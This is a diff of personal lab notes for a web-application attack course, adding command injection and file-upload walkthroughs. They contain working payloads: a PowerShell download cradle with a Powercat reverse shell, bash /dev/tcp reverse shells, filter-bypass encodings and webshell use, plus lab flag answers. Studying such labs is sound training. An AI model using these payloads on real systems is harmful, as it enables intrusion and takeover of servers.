@@ -8,7 +8,7 @@
 ## **Why This Module Matters**
 Regardless of the underlying tech stack, a handful of vulnerability classes show up again and again across web applications. A symptom of skill shortages, time pressure, and fast-moving frameworks. This module covers four of the biggest: Directory Traversal, File Inclusion, File Upload, and Command Injection.
 
-**⚠️ Status:** 9.1, 9.2, and 9.3.1 are all fully done. 9.3.2 (Non-Executable File Upload + Traversal) theory done. **Its lab (VM #1 authorized_keys overwrite, root SSH, /root/flag.txt) still to do live.** 9.4 still to come.
+**✅ Status:** Module fully complete. 9.1 through 9.5 all done, every lab across every section finished.
 
 ---
 
@@ -693,9 +693,10 @@ curl http://mountaindesserts.local:8000/index.php
 curl http://mountaindesserts.local:8000/admin.php
 ```
 *Both 404. The app text itself also states it's back on Linux, and no `index.php`/`meteor/` in the URL this time, suggesting a different backend (not the same PHP app as before).*
-
+![[Pasted image 20260801221756.png]]
 **Step 2: Upload a normal test file, capture the request in Burp**
 Upload `test.txt` via the form, then find the POST request in **Proxy → HTTP History**, send to **Repeater**.
+![[Pasted image 20260801222102.png]]
 
 *Worth checking generally: what happens if you upload the same filename twice? An "already exists" response can be abused to brute-force server file/directory names. A differing error message can leak the backend language/framework.*
 
@@ -722,7 +723,7 @@ Enable **Intercept** in Burp, select the `authorized_keys` file in the upload fo
 ```
 Then **Forward** it.
 
-> 📸 Screenshot worth grabbing: the intercepted request showing the rewritten `filename` field right before forwarding. This is the actual exploitation step.
+![[Pasted image 20260801223103.png]]
 
 *Note: there's no guaranteed way to confirm root even **has** SSH access enabled before trying. Without an `/etc/passwd` read (no LFI here, just this upload+traversal combo), this is the best available shot, so just attempt the connection and see.*
 
@@ -737,16 +738,264 @@ rm ~/.ssh/known_hosts
 ssh -p 2222 -i fileup root@mountaindesserts.local
 ```
 
+> **Lab answer, VM #1:** **`OS{81feec025c7f8b52374d884f804aa2f0}`** (in `/root/flag.txt`, readable directly, no `sudo` even installed since we're already root)
+
+> **🛠️ Troubleshooting hit here: upload request got sent but the response came back empty.**
+> The captured request's `Host` header said `mountaindesserts.local:8000`, but `/etc/hosts` still pointed that hostname at an earlier lab's IP (stale from a previous section, same box name reused across labs). The app's upload form hardcodes that hostname in its form action, so the browser submitted to the wrong (dead) target even though the page itself was loaded via the correct IP.
+> **Fix:** `grep mountaindesserts /etc/hosts`, update the IP with `sed -i` if it's stale, then just re-click **Send** in Repeater, no need to redo the browser upload.
+> **Takeaway:** whenever a hostname gets reused across multiple labs in the same module, double-check `/etc/hosts` still points at the *current* VM before assuming a silent/empty response means the vuln isn't working.
+
 🔁 **Similar to:** this is the mirror image of [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]]'s SSH key theft. There, traversal let us **read** an existing private key off the target. Here, traversal (via the upload's filename field) lets us **write** our own public key onto the target instead. Same vulnerability class (Directory Traversal), opposite direction, same end result (SSH access).
 
 > 🔗 **HackTricks** and **PayloadsAllTheThings** both have file-upload sections covering more filename/path manipulation tricks beyond a simple `../` in case a target's upload form handles the `filename` field differently (e.g. requiring null bytes, double URL-encoding, or a different parameter name entirely).
 
 #### Tags: #NonExecutableFileUpload #UploadPlusTraversal #AuthorizedKeysOverwrite #WebServerPrivileges #SSHKeyPlanting
 
+**Lab status: ✅ Completed:**
+
+| Question | Answer |
+|---|---|
+| VM #1: flag from `/root/flag.txt`, via upload+traversal `authorized_keys` overwrite → root SSH? | **OS{81feec025c7f8b52374d884f804aa2f0}** |
+
+#### Tags: #Lab #Quiz #Module9
+
+> 📋 Generalized copy-pasteable commands for this technique: [[METHODOLOGY CHEAT SHEET#Step 1b: Web Application Exploitation]]
+
+---
+
+## 9.4. Command Injection
+
+### 9.4.1. OS Command Injection
+
+**The root cause:** web apps sometimes need to interact with the underlying OS directly (running a system command, calling out to another tool). The safe way is a prepared/fixed function that user input can only fill in narrow blanks of. The unsafe (but faster to build) way is passing user input straight into a command string and hoping a sanitization filter catches anything dangerous. Command injection is what happens when that filter has gaps.
+
+**Case study: "Mountain Vaults" web app, a git-clone form**
+
+The app takes a `git clone <url>` style command from a form field. If the underlying OS just executes whatever string you give it, you're not limited to the `git clone` part.
+
+**Step 1: Confirm the underlying request shape**
+Capture the form submission in Burp. The parameter is called `Archive` and its value is the full git command.
+
+**Step 2: Try replacing the value entirely with a different command**
+```bash
+curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive
+```
+*Expect something like `Command Injection detected. Aborting...`. A filter is checking the input, and a bare `ipconfig` trips it.*
+
+**Step 3: Try the expected command with nothing else**
+```bash
+curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive
+```
+*Expect git's own help/usage text back. This confirms the filter isn't blocking `git` itself, and that you're not restricted to only `git clone`. Any valid git subcommand should work.*
+
+**Step 4: Use `git version` to fingerprint the OS**
+```bash
+curl -X POST --data 'Archive=git version' http://192.168.50.189:8000/archive
+```
+*Git for Windows includes the word "Windows" in its version string (e.g. `git version 2.35.1.windows.2`). Plain Linux git output won't mention an OS at all. This one command tells you both "is `git` alone allowed" and "what OS is this."*
+
+**Step 5: Chain a second command using a delimiter, URL-encoded**
+```bash
+curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
+```
+*`%3B` is a URL-encoded semicolon. Semicolons separate sequential commands in both Bash and PowerShell. `&&` works too (both platforms), and CMD also accepts a single `&`. Getting both the git help text and `ipconfig` output back confirms the filter is specifically pattern-matching for something like a raw `git` keyword check, not blocking command chaining generally.*
+
+🔁 **Similar to:** URL-encoding a delimiter to smuggle a second command past a filter is the exact same "encode to dodge a plaintext-only filter" idea that's shown up in [[Common Web Application Attacks#9.1.3. Encoding Special Characters|9.1.3]] (traversal dots), [[Common Web Application Attacks#9.2.2. PHP Wrappers|9.2.2]] (`data://` base64), and [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]] (extension case-swap). Different filters, same underlying weakness: they check the literal plaintext form and miss the encoded equivalent.
+
+**Step 6: Work out whether you're landing in CMD or PowerShell**
+```
+(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+```
+*A neat one-liner (credit: PetSerAl) that prints `CMD` if executed there, or `PowerShell` if executed there, since the syntax means different things to each interpreter. URL-encode it and chain it after `git;`:*
+```bash
+curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
+```
+*Output containing `PowerShell` tells you injected commands run in a PowerShell context, which matters for picking the right reverse shell syntax next.*
+
+**Step 7: Host Powercat (a PowerShell-native Netcat-alike) and start a listener**
+```bash
+cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+python3 -m http.server 80
+```
+In a second terminal:
+```bash
+nc -nvlp 4444
+```
+
+**Step 8: Inject a download-cradle + Powercat callback, chained after `git;`**
+```powershell
+IEX (New-Object System.Net.Webclient).DownloadString("http://<your_ip>/powercat.ps1");powercat -c <your_ip> -p 4444 -e powershell
+```
+URL-encode the whole thing and send it as the `Archive` value:
+```bash
+curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<your_ip>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<your_ip>%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
+```
+*Check your Python server's log for a `GET /powercat.ps1` hit, then check your netcat listener for the callback.*
+
+> 🔗 **RevShells** can generate PowerShell reverse shell one-liners directly (including Powercat-style ones) if you'd rather not hand-build this.
+> 🔗 **HackTricks** and **PayloadsAllTheThings** both have dedicated command injection pages covering more filter-bypass delimiters and encodings beyond `;`/`&&`/`&`.
+
+**The bigger picture:** exploitation specifics depend heavily on the target OS, the app's implementation, and whatever filter/sanitization is in place. But the identification workflow is always the same: find where user input reaches a command line, confirm with something harmless, then work out what the filter actually blocks by trial and error rather than guessing.
+
+**Case study 2: VM #2, Linux version, no filter at all this time**
+
+Same "Mountain Vaults" app, same `Archive` parameter, but this instance didn't block bare commands at all:
+```bash
+curl -X POST --data 'Archive=id' http://192.168.167.16/archive
+```
+*Straight back: `uid=1000(stanley) gid=1000(stanley) groups=1000(stanley),27(sudo)`. No `git` prefix or filter bypass needed, and `stanley` being in the `sudo` group is a strong early hint.*
+
+> **🛠️ Troubleshooting hit: reverse shell payload with `&` in it kept failing (`exit status 2`).**
+> A bash reverse shell one-liner contains literal `&` characters (`>&`, `0>&1`). `curl -X POST --data '...'` sends the POST body as `application/x-www-form-urlencoded` **without** encoding the value for you, so any `&` in the payload gets read by the server as a form-field separator, truncating and garbling the actual command it receives.
+> **Fix:** use `--data-urlencode` instead of `--data`, it percent-encodes the value automatically:
+> ```bash
+> curl -X POST --data-urlencode 'Archive=bash -c "bash -i >& /dev/tcp/192.168.45.212/4444 0>&1"' http://192.168.167.16/archive
+> ```
+> **Takeaway:** any time a reverse shell one-liner (or any payload with `&`, `=`, spaces, etc) is going into a POST body via `curl --data`, use `--data-urlencode` rather than hand-encoding or hoping it passes through raw.
+
+**Step: elevate and read the flag**
+```bash
+sudo su
+cat /opt/config.txt
+```
+
+> **Lab answer, VM #2:** **`OS{bd02800d4d498af32e43347e618cdb79}`**
+
+#### Tags: #CommandInjection #GitCloneInjection #FilterBypass #CmdVsPowerShell #Powercat #ReverseShell #DataUrlencode #NoFilterInjection
+
+**Case study 3: VM #3 capstone, "Future Factor Authentication"**
+
+A different app entirely this time, no `git`-shaped hint to start from. A login form with a third field, `ffa`, placeholder text `cfqfd + mqnsr`. The page's own blurb says it "adds two random strings" as a second factor. That placeholder is the whole clue: it's telling you the field expects an *expression*, not a plain string.
+
+**Step 1: Baseline with a plain string**
+```bash
+curl -X POST --data 'username=test&password=test&ffa=test' http://<target>/login
+```
+*Response echoes `Status: test` back verbatim. Establishes what "unprocessed" looks like.*
+
+**Step 2: Test whether it's evaluating arithmetic (possible raw `eval()`)**
+```bash
+curl -X POST --data 'username=test&password=test&ffa=1%2B1' http://<target>/login
+```
+*(`%2B` for a literal `+`, since form-urlencoded data treats a bare `+` as a space.) Still echoed back as literal `1+1`, not `2`. Doesn't look like it's evaluating anything on the surface.*
+
+**Step 3: Test for Jinja2 SSTI instead**
+```bash
+curl -X POST --data 'username=test&password=test&ffa={{7*7}}' http://<target>/login
+```
+*Still literal, no `49`. Also tried a blind out-of-band version (a Jinja2 payload that shells out to `curl` your own listener), no callback either.*
+
+*Along the way, noticed double quotes (`"`) were silently stripped from the reflected value but single quotes (`'`) survived. Worth remembering as its own signal: a character vanishing rather than getting HTML-escaped means something is actively filtering it, not just echoing.*
+
+**Step 4: Reconsider, test plain OS shell metacharacters instead of Python/Jinja2 syntax**
+```bash
+curl -X POST --data-urlencode 'ffa=`curl http://<your_ip>:8888/pwned2`' --data 'username=test&password=test' http://<target>/login
+curl -X POST --data-urlencode 'ffa=$(curl http://<your_ip>:8888/pwned2)' --data 'username=test&password=test' http://<target>/login
+```
+*Neither triggered a callback, **but** the "Status" field came back **blank** for both, a real behavior change from every previous test, which had always echoed the literal raw input. Blank output (rather than literal echo) was the actual tell that something was being evaluated, even though the specific `curl` payload wasn't landing (network egress or missing binary in that container, never fully confirmed why).*
+
+**Step 5: Confirm with a command whose output doesn't depend on network egress**
+```bash
+curl -X POST --data-urlencode 'ffa=`id`' --data 'username=test&password=test' http://<target>/login
+```
+*This time: `Status: uid=1000(yelnats) gid=1000(yelnats) groups=1000(yelnats),27(sudo)`. Confirmed: plain OS command injection via backtick command substitution, and `yelnats` is in the `sudo` group.*
+
+**Step 6: Reverse shell and privesc**
+```bash
+nc -nvlp 4444
+```
+```bash
+curl -X POST --data-urlencode 'ffa=`bash -c "bash -i >& /dev/tcp/<your_ip>/4444 0>&1"`' --data 'username=test&password=test' http://<target>/login
+```
+Once caught:
+```bash
+sudo su
+cat /root/flag.txt
+```
+
+> **Lab answer, VM #3:** **`OS{2ec92caee399131a9ce65488c7363612}`**
+
+🔁 **Similar to:** this whole diagnostic sequence (try arithmetic → try template syntax → try shell metacharacters, watching for *any* change in behavior, not just a hoped-for direct hit) is a good general template for any capstone/unknown injection point where the vulnerability class isn't handed to you. A blank/different response is just as much a signal as a fully working payload.
+
+> 🔗 **HackTricks** has dedicated pages for both SSTI (Jinja2 payload chains) and command injection filter bypasses, worth working through systematically like this rather than guessing randomly when a field's exact behavior is unclear.
+
+#### Tags: #BlindCommandInjection #BacktickInjection #SSTIRuledOut #DiagnosticMethodology #FutureFactorAuthentication
+
+**Case study 4: VM #4 capstone, IIS + ASP.NET file upload, "Stan and Olivers Webdev Shop"**
+
+This one's actually a file upload vulnerability ([[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]]'s territory), not command injection, just wearing an ASP.NET/IIS costume instead of PHP/XAMPP. Grouped in this section since it's the module's final enumerate-it-yourself capstone.
+
+**Step 1: Enumerate**
+```bash
+nmap -p- --min-rate 5000 <target>
+```
+*Found port 80 (default IIS landing page) and port 8000 (a custom ASP.NET WebForms app, "Stan and Olivers Webdev Shop," with a file upload form). The app's own text spells out the vuln: "Please upload your designs on this page and we'll develop it! We save it on the other port for you to watch!" The upload on :8000 lands somewhere :80 (IIS) serves from.*
+
+**Step 2: Check for a ready-made ASP.NET webshell**
+```bash
+ls /usr/share/webshells/aspx/
+```
+*`cmdasp.aspx` is there.*
+
+**Step 3: Upload it via the browser**
+Browse to the app on port 8000, select `cmdasp.aspx` from `/usr/share/webshells/aspx/` in the file picker, click Upload. *ASP.NET WebForms needs its `__VIEWSTATE`/`__EVENTVALIDATION` tokens submitted correctly, fiddly to hand-craft with curl, so the browser form is the easier path.*
+
+**Step 4: Confirm it landed on port 80**
+```bash
+curl http://<target>/cmdasp.aspx
+```
+*Returns the webshell's own command-input HTML form.*
+
+**Step 5: Use the webshell directly in the browser**
+Type a command into its **Command** field and click **execute**. `whoami` confirmed execution as `iis apppool\defaultapppool`. No need for a full reverse shell here since the webshell itself gives command execution directly.
+
+**Step 6: Find and read the flag**
+```
+dir C:\inetpub\ /s /b
+type C:\inetpub\flag.txt
+```
+
+> **Lab answer, VM #4:** **`OS{cb2163ee9fa1e77ab75e146a9d4a7d4a}`**
+
+🔁 **Similar to:** same executable-file-upload pattern as [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]], just IIS/ASP.NET instead of XAMPP/PHP. Worth remembering Kali ships ready-made webshells for both stacks (and more) at `/usr/share/webshells/`.
+
+#### Tags: #ASPNETWebshell #IISFileUpload #CmdaspWebshell #StanAndOliversWebdevShop
+
+**Lab status: ✅ Completed:**
+
+| Question | Answer |
+|---|---|
+| VM #1 (Windows): flag on the Administrator's Desktop, via command injection + Powercat reverse shell? | **OS{55545fc486596fedcdd3c66a36f826de}** (already `mountain\administrator`, no privesc needed; flag was on the actual Desktop folder, not the app's working directory) |
+| VM #2 (Linux): flag in `/opt/config.txt` after `sudo su`? | **OS{bd02800d4d498af32e43347e618cdb79}** |
+| VM #3 (capstone, Future Factor Authentication): flag in `/root/`? | **OS{2ec92caee399131a9ce65488c7363612}** |
+| VM #4 (capstone, IIS/ASP.NET upload): flag in `C:\inetpub\flag.txt`? | **OS{cb2163ee9fa1e77ab75e146a9d4a7d4a}** |
+
+#### Tags: #Lab #Quiz #Module9
+
+> 📋 Generalized copy-pasteable commands for this technique: [[METHODOLOGY CHEAT SHEET#Step 1b: Web Application Exploitation]]
+> 🧭 Quick lookup: [[DECISION TREE#Web Applications]]
+
+---
+
+## 9.5. Wrapping Up
+
+This module covered four of the most common web application vulnerability classes, and they build on each other:
+
+1. **Directory Traversal** reads files outside the web root.
+2. **File Inclusion** goes a step further and actually executes what it includes, not just reads it.
+3. **File Upload** vulnerabilities let you plant that executable content directly, or (if execution isn't possible) combine the upload with traversal to overwrite something sensitive instead.
+4. **Command Injection** skips file tricks entirely and hands you the OS command line directly.
+
+None of these are tied to a specific language or framework in principle, but *how* you exploit them is. Always take a moment to fingerprint the tech stack before diving into exploitation.
+
+Found on a public-facing app, any of these can be your initial foothold. Found on an internal app during an engagement, they're just as often your lateral movement vector. Worth checking for on every web app you touch, not just the "obvious" ones.
+
+#### Tags: #Module9Summary #WebAppAttacksRecap
+
 ---
 
 ## **Outstanding Sections**
 - [x] **9.1 Directory Traversal (9.1.1 to 9.1.3)**: done (theory, Mountain Desserts SSH key → shell, Grafana CVE-2021-43798 x2, Apache CVE-2021-41773 via URL encoding)
 - [x] **9.2 File Inclusion Vulnerabilities (9.2.1 to 9.2.3)**: done (LFI + log poisoning, PHP wrappers, RFI, all labs complete across both VMs)
-- [ ] **9.3 File Upload Attack Vulnerabilities**: 9.3.1 done (both labs). 9.3.2 (upload + traversal) theory done, **1 lab pending** (VM #1 authorized_keys overwrite → root SSH flag)
-- [ ] **9.4 Command Injection**: pending
+- [x] **9.3 File Upload Attack Vulnerabilities (9.3.1 to 9.3.2)**: done (executable upload bypass across 3 VMs, upload+traversal authorized_keys overwrite)
+- [x] **9.4 Command Injection + 9.5 Wrapping Up**: done, all 4 labs complete (VM #1 Windows Administrator desktop, VM #2 Linux /opt/config.txt, VM #3 capstone Future Factor Authentication /root/, VM #4 capstone IIS/ASP.NET upload C:\inetpub\)
